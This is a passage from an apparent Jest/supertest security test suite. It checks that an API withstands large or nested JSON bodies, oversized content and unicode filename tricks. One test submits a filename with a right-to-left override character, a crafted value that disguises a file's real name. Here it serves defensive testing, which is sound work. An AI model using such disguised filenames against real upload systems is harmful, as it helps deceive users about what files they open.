        .send({ html: JSON.stringify(nested) });

      // Should not crash
      expect([200, 400, 413]).toContain(response.status);
    });

    it('Handles large JSON arrays', async () => {
      const largeArray = new Array(10000).fill('test');

      const response = await request(app)
        .post('/api/content')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ html: JSON.stringify(largeArray) });

      expect([200, 400, 413]).toContain(response.status);
    });
  });

  describe('Unicode Attacks', () => {
    it('Handles unicode in filenames', async () => {
      // Unicode normalization attack with right-to-left override
      // Should either sanitize and accept (201) or reject (400)
      const response = await request(app)
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ filename: 'test\u202E\u0070\u0064\u0066.txt', content: 'data' });

      // Accept either sanitization (201) or rejection (400)
      expect([201, 400]).toContain(response.status);
    });

    it('Handles zero-width characters', async () => {
      const response = await request(app)
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ filename: 'test\u200B\u200C\u200D.pdf', content: 'data' });

      // Should handle or reject
      expect([201, 400]).toContain(response.status);
    });
  });

  describe('Content Length Validation', () => {
    it('Rejects requests exceeding limit', async () => {
      const largeContent = 'x'.repeat(11 * 1024 * 1024); // 11MB

      const response = await request(app)
        .post('/api/content')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ html: largeContent });

      expect([413, 400, 500]).toContain(response.status);
    });
  });
});
